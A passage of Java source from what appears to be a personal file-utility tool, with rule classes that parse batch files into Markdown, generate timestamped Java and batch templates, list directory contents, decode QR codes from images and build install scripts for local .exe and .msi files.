			allFormatList.add(batHead_2); // setlocal enabledelayedexpansion
			allFormatList.add(batHead_3); // chcp 65001
			for (int i = 0; i < areaList.size(); i++) {
				Bat_Aera batArea_Item = areaList.get(i);
				ArrayList<String> AreaContent = batArea_Item.getAreaFormatContent();
				allFormatList.addAll(AreaContent);
			}

			return allFormatList;

		}

		void showStringList(ArrayList<String> strList) {

			if (strList == null || strList.size() == 0) {
				System.out.println("当前调用 showStringList 显示的  ArrayList<String>() 字符串数组为空!! ");
				return;
			}

			int line_num = 0;
			System.out.println(
					"════════════════════ ArrayList<String>  " + strList.size() + " 行字符串" + "════════════════════ ");
			for (int i = 0; i < strList.size(); i++) {
				line_num++;
				String oneStr = strList.get(i);
				System.out.println("Line[" + line_num + "]   " + oneStr);

			}
			System.out.println();
		}

		void showStringList_WithHead(ArrayList<String> strList, String tag) {

			if (strList == null || strList.size() == 0) {
				System.out.println("当前调用 showStringList 显示的  ArrayList<String>() 字符串数组为空!! ");
				return;
			}

			int line_num = 0;
			System.out.println("════════════════════ showStringList_WithHead  ArrayList<String>  " + strList.size()
					+ " 行字符串 " + tag + " begin " + "════════════════════ ");
			System.out.println("ZZZZZZZZZZZZZZZZZZZZ");
			for (int i = 0; i < strList.size(); i++) {
				line_num++;
				String oneStr = strList.get(i);
				System.out.println(oneStr);

			}
			System.out.println("ZZZZZZZZZZZZZZZZZZZZ");

			System.out.println("════════════════════ showStringList_WithHead  ArrayList<String>  " + strList.size()
					+ " 行字符串 " + tag + " end " + "════════════════════ ");

			System.out.println();
		}

		void showStringList(ArrayList<String> strList, String tag) {

			if (strList == null || strList.size() == 0) {
				System.out.println("当前调用 showStringList 显示的  ArrayList<String>() 字符串数组为空!! ");
				return;
			}

			int line_num = 0;
			System.out.println(
					"════════════════════ ArrayList<String>  " + strList.size() + " 行字符串" + "════════════════════ ");
			for (int i = 0; i < strList.size(); i++) {
				line_num++;
				String oneStr = strList.get(i);
				System.out.println("tag=[" + tag + "] Line[" + line_num + "]   " + oneStr);

			}
			System.out.println();
		}

		public boolean isNumeric(String string) {
			String str = string.trim();
			for (int i = str.length(); --i >= 0;) {
				if (!Character.isDigit(str.charAt(i))) {
					return false;
				}
			}
			return true;
		}

		void initRawContentInArea(ArrayList<String> batContentList, ArrayList<Bat_Aera> areaList) {

			for (int i = 0; i < areaList.size(); i++) {
				Bat_Aera curArea = areaList.get(i);
				ArrayList<String> area_raw_contentList = new ArrayList<String>();

				for (int j = 0; j < batContentList.size(); j++) {
					String oneLineStr = batContentList.get(j);
					isAreaBegin = curArea.isAreaBegin(oneLineStr);
					if (isAreaBegin) {
						isAreaRawBegin = true;
					}
					isAreaEnd = curArea.isAreaEnd(oneLineStr);
					if (isAreaEnd) {
						isAreaRawBegin = false;
						area_raw_contentList.add(oneLineStr);
					}

					if (isAreaRawBegin) {
//    				System.out.println("isAreaBegin="+ isAreaBegin + "   isAreaEnd="+ isAreaEnd + "  isRawBegin="+ isRawBegin);
						area_raw_contentList.add(oneLineStr);
					}

//    			System.out.println("index["+j+"] "+"isAreaBegin="+ isAreaBegin + "   isAreaEnd="+ isAreaEnd + "  isRawBegin="+ isRawBegin);

				}
				curArea.aera_raw_content.addAll(area_raw_contentList);
				isAreaBegin = false;
				isAreaEnd = false;
				isAreaRawBegin = false;
				System.out.println(curArea.aera_name + " 的 raw列表如下");
				showStringList(curArea.aera_raw_content, curArea.aera_name);

				curArea.initDataWithRawContent(area_raw_contentList);
			}

		}

		Bat_Method getMethodByName(String methodName) {
			Bat_Method selectedMethod = null;

			for (int i = 0; i < allMethodList.size(); i++) {
				Bat_Method currentMethod = allMethodList.get(i);
				if (currentMethod.bat_method_name_nofunc.trim().toLowerCase().equals(methodName.toLowerCase().trim())) {
					return currentMethod;
				}
			}
			return selectedMethod;
		}

		volatile boolean isAreaBegin = false;
		volatile boolean isAreaEnd = false;
		volatile boolean isAreaRawBegin = false;

		volatile boolean isOperationBegin = false;
		volatile boolean isOperationEnd = false;
		volatile boolean isOperationRawBegin = false;

		volatile boolean isMethodBegin = false;
		volatile boolean isMethodEnd = false;
		volatile boolean isMethodRawBegin = false;

	}

	// 把当前模板文件 zbatrule_I9_Rule30.bat 内容写进当前目录下 Test_20200201_xxx(时间戳).bat 文档 并打开它
	class Show_Bat_Template_OnDir_Rule_30 extends Basic_Rule {
		File bat_template_file;

		Show_Bat_Template_OnDir_Rule_30() {
			super(30, false);
			bat_template_file = new File(
					zbinPath + File.separator + "win_zbin" + File.separator + "zbatrule_I9_Rule30.bat");
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			ArrayList<String> result_list = new ArrayList<String>();
			if (!bat_template_file.exists()) {
				result_list.add("当前 模板文件 " + bat_template_file.getAbsolutePath() + " 不存在 请检查该文件！");
				System.out.println("失败 无法 读取 zbatrule_I9_Rule30.bat 模板文件! " + bat_template_file.getAbsolutePath());
			} else {
				ArrayList<String> contentList = ReadFileContentAsList(bat_template_file);

				for (int i = 0; i < contentList.size(); i++) {
					String oneLine = contentList.get(i);
					/*
					 * // bat 文件 不需要在文件中的名字 没有名字
					 * if(oneLine.contains("public class I9_TestJavaTemplate_Rule29")) {
					 *
					 * oneLine = oneLine.replace("public class I9_TestJavaTemplate_Rule29",
					 * "public class Test_"+getTimeStampMMdd()); }
					 */
					result_list.add(oneLine);
				}
				System.out.println("成功读取 I9_TextRuleOperation  Show_Bat_Template_OnDir_Rule_30.java "
						+ bat_template_file.getAbsolutePath() + " 模板文件! ");

				// public class I9_TestJavaTemplate_Rule29 把这个文件改名为 Test_0510 这样的日期
			}

			// 找到 开始解析 .bat 文件
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				String curBatName = "test_" + getTimeStampLong() + ".bat";
				File curBatFile = new File(fileItem.getParentFile().getAbsolutePath() + File.separator + curBatName);
				result_list.add("rem ___CMD_Commond__  cmd /k " + curBatFile.getAbsolutePath());
				writeContentToFile(curBatFile, result_list);
				NotePadOpenTargetFile(curBatFile.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前模板文件 zbatrule_I9_Rule30.bat 内容写进当前目录下 Test_20200201_xxx(时间戳).bat 文档 并打开它  ";
		}

	}

	class Bat_Revert_MD_Rule29 extends Basic_Rule {
		Bat_Format_Rule_31 revertTool;
		File batTemplateFile; // bat 模板文件

		Bat_Revert_MD_Rule29() {
			super(29, false);
			revertTool = new Bat_Format_Rule_31();
			batTemplateFile = new File(
					zbinPath + File.separator + "win_zbin" + File.separator + "zbatrule_I9_Rule30.bat");

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			ArrayList<String> MDAllContentList = new ArrayList<String>();

			ArrayList<String> MDHeadRawList = new ArrayList<String>();
			MDHeadRawList.add("---");
			MDHeadRawList.add("layout: post");
			MDHeadRawList.add("title: Bat技巧记载");
			MDHeadRawList.add("category: 代码");
			MDHeadRawList.add("tags: Bat");
			MDHeadRawList.add("keywords: Code Bat");
			MDHeadRawList.add("typora-root-url: ..\\..\\..\\");
			MDHeadRawList.add("typora-copy-images-to: ..\\..\\..\\public\\zimage");
			MDHeadRawList.add("");
			MDHeadRawList.add("---");
			MDHeadRawList.add("");
			MDHeadRawList.add("## 简介                                           ");
			MDHeadRawList.add(" * TOC                                            ");
			MDHeadRawList.add(" {:toc}                                           ");
			MDHeadRawList.add("");

			ArrayList<String> MDBodyRawList = new ArrayList<String>();

			ArrayList<String> RawContentList = ReadFileContentAsList(batTemplateFile);
			// 解析 模板 文件 生成 format 格式 并 尝试 解析为 MD文件

			// 解析好格式的 formatList 作为源码 保存在 最后
			ArrayList<String> formatRawBatList = revertTool.Bat_To_Format(RawContentList);
			ArrayList<Bat_Format_Rule_31.Bat_Aera> batAreaList = revertTool.mAreaList;

			for (int i = 0; i < batAreaList.size(); i++) {
				Bat_Format_Rule_31.Bat_Aera batAreaItem = batAreaList.get(i);
				String areName = batAreaItem.aera_name;
				ArrayList<String> areaRawConent = batAreaItem.getAreaFormatContent();
				MDBodyRawList.add("");
				MDBodyRawList.add("## " + areName);
				MDBodyRawList.add("");
				if (batAreaItem.defineOperationList == null || batAreaItem.defineOperationList.size() == 0) {
					MDBodyRawList.add("");
					MDBodyRawList.add("**代码区域**");
					MDBodyRawList.add("```");
					MDBodyRawList.addAll(areaRawConent);
					MDBodyRawList.add("```");
					MDBodyRawList.add("");
					continue;
				}

				for (int j = 0; j < batAreaItem.defineOperationList.size(); j++) {
					Bat_Format_Rule_31.Bat_Operation curOperation = batAreaItem.defineOperationList.get(j);

					String operationName = curOperation.operation_name;
					MDBodyRawList.add("");
					MDBodyRawList.add("### " + operationName);
					MDBodyRawList.add("");

					for (int k = 0; k < curOperation.operation_MethodList.size(); k++) {

						Bat_Format_Rule_31.Bat_Method methodItem = curOperation.operation_MethodList.get(k);

						String methodName = methodItem.bat_method_name;
						MDBodyRawList.add("");
						MDBodyRawList.add("");
						MDBodyRawList.add("#### " + methodName);

						ArrayList<String> methodRuleTip = methodItem.method_ruletip_list;
						ArrayList<String> methodDescList = methodItem.method_desc_list;
						ArrayList<String> methodFormatContentList = methodItem.method_format_content;
						ArrayList<String> methodSampleList = methodItem.method_Sample_list;
						ArrayList<String> methodSampleOutList = methodItem.method_SampleOut_list;
						addListToMDList(MDBodyRawList, methodRuleTip, "提示");
						addListToMDList(MDBodyRawList, methodDescList, "描述");
						addListToMDList(MDBodyRawList, methodSampleList, "代码实例");
						addListToMDList(MDBodyRawList, methodSampleOutList, "实例输出");
						addCodeListToMDList(MDBodyRawList, methodFormatContentList, "代码区域");

					}

				}
			}

			MDBodyRawList.add("");
			MDBodyRawList.add("## " + "bat代码环境");
			MDBodyRawList.add("");
			MDBodyRawList.add("```");
			MDBodyRawList.addAll(formatRawBatList);
			MDBodyRawList.add("```");
			MDBodyRawList.add("");

			MDAllContentList.addAll(MDHeadRawList);
			MDAllContentList.addAll(MDBodyRawList);

			writeContentToFile(I9_Temp_Text_File, MDAllContentList);
			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			/*
			 * for (int i = 0; i < curInputFileList.size(); i++) { File fileItem =
			 * curInputFileList.get(i); ArrayList<String> contentList =
			 * ReadFileContentAsList(fileItem); }
			 */
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		void addListToMDList(ArrayList<String> originList, ArrayList<String> addList, String tag) {

			if (addList.size() > 0 && originList.size() > 0) {
				originList.add("");
				originList.add("**" + tag + "**");
				originList.add("");
				originList.add("```");

				for (int i = 0; i < addList.size(); i++) {
					String addItemStr = addList.get(i);
					String fixedItem = addItemStr.replace("rem rule_tip:", "");
					fixedItem = fixedItem.replace("rem desc:", "");
					fixedItem = fixedItem.replace("rem sample:", "");
					fixedItem = fixedItem.replace("rem sample_out:", "");
					originList.add(fixedItem);
				}
				originList.add("```");
			}
			originList.add("");

		}

		void addCodeListToMDList(ArrayList<String> originList, ArrayList<String> addList, String tag) {

			if (addList.size() > 0 && originList.size() > 0) {

				originList.add("**" + tag + "**");
				originList.add("");
				originList.add("```");

				for (int i = 0; i < addList.size(); i++) {
					String addItemStr = addList.get(i);

					originList.add(addItemStr);
				}
				originList.add("```");
			}
			originList.add("");

		}

		@Override
		String simpleDesc() {
			return " 读取当前指定模板文件 win_zbin/zbatrule_I9_Rule30.bat 生成解析的MD文件 ";
		}

	}

	// 生成java Test模板文件 读取 Java模板文件(包含初始化模块) 然后在notepad++打开它
	class Show_JavaTest_File_Rule_28 extends Basic_Rule {
		File java_template_file;

		Show_JavaTest_File_Rule_28() {
			super(28, false);
			java_template_file = new File(zbinPath + File.separator + "I9_TestJavaTemplate_Rule29.java");

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			ArrayList<String> result_list = new ArrayList<String>();
			String Test_Java_FileName = "Test_" + getTimeStampMMdd() + "_" + getTimeStampHHmmss();
			String public_class_declare = "public class " + Test_Java_FileName;
			if (!java_template_file.exists()) {
				result_list.add("当前 模板文件 " + java_template_file.getAbsolutePath() + " 不存在 请检查该文件！");
				System.out.println(
						"失败 无法 读取 I9_TestJavaTemplate_Rule29.java 模板文件! " + java_template_file.getAbsolutePath());
			} else {
				ArrayList<String> contentList = ReadFileContentAsList(java_template_file);

				for (int i = 0; i < contentList.size(); i++) {
					String oneLine = contentList.get(i);
					if (oneLine.contains("public class I9_TestJavaTemplate_Rule29")) {

						oneLine = oneLine.replace("public class I9_TestJavaTemplate_Rule29", public_class_declare);
					}
					result_list.add(oneLine);
				}
				System.out.println("成功读取 I9_TestJavaTemplate_Rule29.java 模板文件! ");

				// public class I9_TestJavaTemplate_Rule29 把这个文件改名为 Test_0510 这样的日期
			}

			// 开始复制到 本地 java 文件
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				String java_end_file = Test_Java_FileName + ".java";
				String class_end_file = Test_Java_FileName + ".class";
				File javaFile = new File(fileItem.getParentFile().getAbsolutePath() + File.separator + java_end_file);
				String classAbsPath = fileItem.getParentFile().getAbsolutePath() + File.separator + class_end_file;
				String parentPath = fileItem.getParentFile().getAbsolutePath();
				/*
				 * Run绝对路径: javac -encoding UTF-8 D:\Test\Test_0514_160618.java && java -cp
				 * .;D:\Test Test_0514_160618 Run相对路径: javac -encoding UTF-8
				 * Test_0514_160618.java && java -cp .; Test_0514_160618 notepad++: 执行快捷键 alt+j
				 * notepad运行java命令: javac -encoding UTF-8 $(FULL_CURRENT_PATH) && java
				 * .;$(CURRENT_DIRECTORY) $(NAME_PART)
				 */

				result_list.add("/*");
				result_list.add("cmder_Run绝对路径:");
				result_list.add("javac  -encoding UTF-8 " + javaFile.getAbsolutePath() + " && " + " java -cp .;"
						+ parentPath + " " + Test_Java_FileName);
				result_list.add("cmder_Run相对路径:");
				result_list
						.add("javac -encoding UTF-8 " + java_end_file + " && java -cp .;" + " " + Test_Java_FileName);
				result_list.add("notepad++: 执行快捷键  alt+j");
				result_list.add("notepad运行java命令:");
				result_list.add(
						"cmd /K cd /d $(CURRENT_DIRECTORY) && javac  -encoding UTF-8 $(FULL_CURRENT_PATH) && java -cp .;$(CURRENT_DIRECTORY) $(NAME_PART)");
				result_list.add("*/");
				writeContentToFile(javaFile, result_list);
				NotePadOpenTargetFile(javaFile.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "  生成java Test模板文件 读取 Java模板文件(包含初始化模块)  然后在notepad++打开它  ";
		}

	}

	// 把当前文件内容以 ZZZZZZZZZZZZZZZZZZZZZ 分割 专门生成剪切内容保存到零时txt文件
	class Copy_Port_WithZ_Rule27 extends Basic_Rule {

		int begin_Z_lineNum = 0;
		int end_Z_lineNum = 0;

		Copy_Port_WithZ_Rule27() {
			super(27, false);
			begin_Z_lineNum = 0;
			end_Z_lineNum = 0;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				// 找到 起始为ZZZZZ 开头的 行数

				for (int j = 0; j < contentList.size(); j++) {
					String lineContent = contentList.get(j);
					if (lineContent.startsWith("Z") || lineContent.startsWith("z")) {

						if (lineContent.startsWith("z") || lineContent.startsWith("Z")) {

							String clearZ_Str = lineContent.replace("z", "").replace("Z", "").trim();
							if (lineContent.length() >= 5 && "".equals(clearZ_Str)) {
								if (begin_Z_lineNum == 0 && end_Z_lineNum == 0) {
									begin_Z_lineNum = j;
									continue;
								}
								if (begin_Z_lineNum != 0 && end_Z_lineNum == 0) {
									end_Z_lineNum = j;
									if (begin_Z_lineNum > 0 && end_Z_lineNum > 0 && begin_Z_lineNum < end_Z_lineNum) {
										break;
									}
								}
							}
						}
					}
				}
				System.out.println("begin_Z_lineNum = " + begin_Z_lineNum + "  end_Z_lineNum = " + end_Z_lineNum
						+ "   contentList.size() =" + contentList.size());
				if (begin_Z_lineNum > 0 && end_Z_lineNum > 0 && begin_Z_lineNum < end_Z_lineNum
						&& end_Z_lineNum <= contentList.size()) {
					ArrayList<String> fixedStrArr = new ArrayList<String>();
					for (int j = begin_Z_lineNum; j <= end_Z_lineNum; j++) {
						fixedStrArr.add(contentList.get(j));
					}
					if (fixedStrArr.size() >= 2) {
						fixedStrArr.remove(0);
						fixedStrArr.remove(fixedStrArr.size() - 1);
					}
					writeContentToFile(I9_Temp_Text_File, fixedStrArr);
					NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
					System.out.println("rule_" + rule_index + " -> 已经截取了 ZZZZZZ之间的【" + (end_Z_lineNum - begin_Z_lineNum)
							+ "行】内容到 TEMP TXT 文件");

				}

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 读取当前文件的内容 并寻找上下以ZZZZZZZ标记的行, 复制两行ZZZZ标记的之间的内容到零时txt文件 ";
		}

	}

	// 读取当前文件的内容 并在当前文件夹下内寻找该文件 复制到输入文件名称_时间戳目录
	class Fliter_Copy_File_WithName_Rule_26 extends Basic_Rule {

		Fliter_Copy_File_WithName_Rule_26(boolean mIsInputDirAsSearchPoint) {
			super(26);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;

		}

		Fliter_Copy_File_WithName_Rule_26() {
			super(26, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			ArrayList<File> realShellFileList = new ArrayList<File>();
			ArrayList<String> logInfo = new ArrayList<String>();
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				File curDirFile = fileItem.getParentFile();
				logInfo.add("==============记录文件" + curDirFile.getName() + "==============");
				String curDirPath = curDirFile.getAbsolutePath();
				String new_dir_name = (curDirPath + File.separator + fileItem.getName() + "_" + getTimeStamp())
						.replace(".", "_");
				ArrayList<String> rawContentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedPathDir = fixedFirstWordPath(rawContentList);

				if (curDirFile != null) {
					for (int j = 0; j < fixedPathDir.size(); j++) {
						String lineName = fixedPathDir.get(j);
						File realFileItem = new File(curDirPath + File.separator + lineName);

						if (realFileItem.exists() && realFileItem.isFile()) {

							realShellFileList.add(realFileItem);
						}
					}
				}

				if (realShellFileList.size() > 0) {
					File curOperationDirFile = new File(new_dir_name);
					curOperationDirFile.mkdirs();
					String targetDirPath = curOperationDirFile.getAbsolutePath();
					for (int j = 0; j < realShellFileList.size(); j++) {
						File srcFile = realShellFileList.get(j);
						String fileName = srcFile.getName();
						File targetFile = new File(targetDirPath + File.separator + fileName);
						fileCopy(srcFile, targetFile);
						logInfo.add("复制过滤文件[" + j + "] = " + targetFile.getAbsolutePath());
					}
				}

				writeContentToFile(I9_Temp_Text_File, logInfo);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 读取当前文件的内容 并在当前文件夹下内寻找该文件 复制到输入文件名称_时间戳目录";
		}

		ArrayList<String> fixedFirstWordPath(ArrayList<String> rawList) {
			ArrayList<String> fixedList = new ArrayList<String>();

			for (int i = 0; i < rawList.size(); i++) {
				String itemStr = rawList.get(i).trim();
				itemStr = itemStr.replace("\\", File.separator);
				itemStr = itemStr.replace("/", File.separator);
				itemStr = itemStr.replace("?", "");
				itemStr = itemStr.replace("!", "");
				itemStr = itemStr.replace("！", "");
				itemStr = itemStr.replace("？", "");
				itemStr = itemStr.replace("#", "");
				itemStr = itemStr.replace("@", "");
				itemStr = itemStr.replace("￥", "");
				itemStr = itemStr.replace("~", "");
				itemStr = itemStr.replace("&", "");
				itemStr = itemStr.replace("*", "");
				itemStr = itemStr.replace("|", "");
				itemStr = itemStr.replace("<", "");
				itemStr = itemStr.replace(">", "");
				itemStr = itemStr.replace("。", "");
				itemStr = itemStr.replace(",", "");
				itemStr = itemStr.replace("+", "");
				itemStr = itemStr.replace("\"", "");
				itemStr = itemStr.replace("：", "");
				itemStr = itemStr.replace(":", "");
				itemStr = itemStr.replace(File.separator + File.separator, File.separator);
				itemStr = itemStr.replace(File.separator + File.separator, File.separator);
				itemStr = itemStr.replace("\t", " ");
				if ("".equals(itemStr)) {
					continue;
				}

				fixedList.add(itemStr);

			}

			return fixedList;

		}

	}

	// 读取当前文件下的 实体文件的文件名称 输出到列表中
	class LS_Shell_RealFile_Rule_25 extends Basic_Rule {

		LS_Shell_RealFile_Rule_25(boolean mIsInputDirAsSearchPoint) {
			super(25);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		LS_Shell_RealFile_Rule_25() {
			super(25, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			ArrayList<String> realFileNameList = new ArrayList<String>();

			File dirFile = curInputFileList.get(0).getParentFile();
			File[] fileList = dirFile.listFiles();
			System.out.println("dirFile = " + dirFile + "        fileList = " + fileList.length);
			ArrayList<File> CurRealFileList = new ArrayList<File>();

			CurRealFileList.addAll(Arrays.asList(fileList));

			realFileNameList.add("____________________ 实体文件 ____________________");
			for (int i = 0; i < CurRealFileList.size(); i++) {
				File fileItem = CurRealFileList.get(i);
				String fileName = fileItem.getName();
				if (fileItem.isFile() && fileItem.exists()) {
					realFileNameList.add(fileName);
				}
			}

			realFileNameList.add("\n");
			realFileNameList.add("____________________ 目录文件 ____________________");

			for (int i = 0; i < CurRealFileList.size(); i++) {
				File fileItem = CurRealFileList.get(i);
				String fileName = fileItem.getName();
				if (fileItem.isDirectory() && fileItem.exists()) {
					realFileNameList.add(fileName);
				}
			}

			writeContentToFile(I9_Temp_Text_File, realFileNameList);
			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前 目录下的实体文件 以及文件夹 文件名称打印出来 !";
		}

	}

	// 读取当前目录的文件夹 里面的 jpg 和 png 把 读取到的二维码打印出来 到当前 页面
	class Image2QrCode_Rule_16 extends Basic_Rule {

		Image2QrCode_Rule_16(boolean mIsInputDirAsSearchPoint) {
			super(16);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		Image2QrCode_Rule_16() {
			super(16, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			ArrayList<String> AllQrStrList = new ArrayList<String>();
			ArrayList<String> CommonQrStrList = new ArrayList<String>();
			ArrayList<String> manageStrList = new ArrayList<String>();
			File dirFile = curInputFileList.get(0).getParentFile();
			File[] fileList = dirFile.listFiles();
			System.out.println("dirFile = " + dirFile + "        fileList = " + fileList.length);
			ArrayList<File> CurImageFileList = new ArrayList<File>();

			CurImageFileList.addAll(Arrays.asList(fileList));

			for (int i = 0; i < CurImageFileList.size(); i++) {
				File fileItem = CurImageFileList.get(i);
				String fileName_lower = fileItem.getName().toLowerCase();
				String qrStr = "";
				if (fileName_lower.endsWith(".jpg") || fileName_lower.endsWith(".png")) {

					if (CUR_OS_TYPE == OS_TYPE.Windows) {
						qrStr = Image2QrCode_Rule_24_Win(fileItem);
					} else if (CUR_OS_TYPE == OS_TYPE.MacOS) {
						// 实现 Mac 下 读取 二维码
//                        TextAs_QrCode_Rule_15_Mac(fileItem);
						qrStr = Image2QrCode_Rule_24_Win(fileItem);

					} else if (CUR_OS_TYPE == OS_TYPE.Linux) {
						System.out.println("无法在 Linux  下实现  没有notepad++ 啊! ");
					}

				}

				// magnet:?xt=urn:btih:
				if (qrStr != null && !"".equals(qrStr)) {
					if (qrStr.startsWith("magnet:")) {
						manageStrList.add(qrStr);
					} else {
						CommonQrStrList.add(qrStr);
					}

				}
			}

			AllQrStrList.addAll(manageStrList);
			AllQrStrList.add("");
			AllQrStrList.add("");
			if (CommonQrStrList.size() > 0) {
				AllQrStrList.add("═════════ 普通二维码 ═════════");
				AllQrStrList.addAll(CommonQrStrList);
			}

			writeContentToFile(I9_Temp_Text_File, AllQrStrList);
			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把当前路径下的图片中的QrCode png jpg二维码打印出来";
		}

	}

	// 往 每行的加入占位符 开头加入 〖* 第一个空格前加入*
	class Create_Install_Command_Rule_23 extends Basic_Rule {
		Create_Install_Command_Rule_23(boolean mIsInputDirAsSearchPoint) {
			super(23);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;

		}

		Create_Install_Command_Rule_23() {
			super(23, true);
		}

		ArrayList<File> getFileTypeList(File[] fileList, String type) {
			ArrayList<File> fliterList = new ArrayList<File>();
			if (fileList == null) {
				return fliterList;
			}
			for (int i = 0; i < fileList.length; i++) {
				if (fileList[i].getName().toLowerCase().endsWith(type.toLowerCase())) {
					fliterList.add(fileList[i]);
				}
			}
			return fliterList;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			File dirFile = curInputFileList.get(0).getParentFile();
			File[] fileList = dirFile.listFiles();
			System.out.println("dirFile = " + dirFile + "        fileList = " + fileList.length);
			ArrayList<File> exeFileList = getFileTypeList(fileList, ".exe");
			ArrayList<File> msiFileList = getFileTypeList(fileList, ".msi");
			ArrayList<File> allOperationFile = new ArrayList<File>();
			if (exeFileList != null) {
				allOperationFile.addAll(exeFileList);
			}

			if (msiFileList != null) {
				allOperationFile.addAll(msiFileList);
			}

			if (allOperationFile.size() == 0) {
				System.out.println("当前没有 exe 和 msi 文件  程序 退出！");
				return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
			}
			System.out.println("allOperationFile.size = " + allOperationFile.size());

			allOperationFile.sort(new Comparator<File>() {
				@Override
				public int compare(File o1, File o2) {
					long modify1 = o1.lastModified();
					long modify2 = o2.lastModified();
					if (modify1 == modify2)
						return 0;
					return modify1 > modify2 ? -1 : 1;
				}
			});
			String curShellPath = dirFile.getAbsolutePath();
			ArrayList<String> command_ContentList = new ArrayList<String>();

			File rule23_template_bat_file = new File(zbinPath + File.separator + "I9_Template_Rule23.txt");
			if (!rule23_template_bat_file.exists()) {
				System.out.println("当前模板文件不存在! 请检查  执行失败!  rule23_template_bat_file = "
						+ rule23_template_bat_file.getAbsolutePath());
				return null;
			}
			ArrayList<String> templateStrList = ReadFileContentAsList(rule23_template_bat_file);

			ArrayList<String> allCommand_InNotepad = new ArrayList<String>();
			ArrayList<String> allCommand_In_RawBat = new ArrayList<String>();
			for (int i = 0; i < allOperationFile.size(); i++) {
				ArrayList<String> curTemplateList = new ArrayList<String>();
				ArrayList<String> targetTemplateList = new ArrayList<String>();
//                Collections.copy(curTemplateList, templateStrList);

				curTemplateList.add("@echo off");
				curTemplateList.add("Setlocal ENABLEDELAYEDEXPANSION");

				for (int j = 0; j < templateStrList.size(); j++) {
					String newItem = new String(templateStrList.get(j));

					curTemplateList.add(newItem);
				}

				File fileItem = allOperationFile.get(i);
				String fileName = fileItem.getName(); // 【ZCUR_NAME】
				String absPath = fileItem.getAbsolutePath();// 【ZABSPATH】
				String fileName_NoPOint = getFileNameNoPoint(fileName);
				String absPath_NoPoint = fileItem.getParentFile().getAbsolutePath() + File.separator + fileName_NoPOint; // 【ZABSPATH_NOPOINT】

				allCommand_In_RawBat.add("echo ===============" + absPath + "===============");

				for (int j = 0; j < curTemplateList.size(); j++) {
					String oneCode = curTemplateList.get(j);
					oneCode = oneCode.replace("【ZCUR_NAME】", fileName);
					oneCode = oneCode.replace("【ZABSPATH】", absPath);
					oneCode = oneCode.replace("【ZABSPATH_NOPOINT】", absPath_NoPoint);
					targetTemplateList.add(oneCode);
					allCommand_In_RawBat.add(oneCode);
				}

				String newBatFile = fileItem.getParentFile().getAbsolutePath() + File.separator + "zbat_"
						+ fileName_NoPOint + ".bat";

				writeContentToFile(new File(newBatFile), targetTemplateList); // 对当前文件的文件进行 bat创建
				allCommand_InNotepad.add("===============" + absPath + "===============");
				allCommand_InNotepad.addAll(targetTemplateList);
				allCommand_InNotepad.add("\n\n");

				allCommand_In_RawBat.add("");
				allCommand_In_RawBat.add("");

			}

			ArrayList<String> allCommand_In_Bat_Fixed = new ArrayList<String>();
			allCommand_In_Bat_Fixed.add("@echo off");
			allCommand_In_Bat_Fixed.add("Setlocal ENABLEDELAYEDEXPANSION");
			allCommand_In_Bat_Fixed.addAll(allCommand_In_RawBat);
			writeContentToFile(new File(curShellPath + File.separator + "zAll_Install.bat"), allCommand_In_Bat_Fixed);
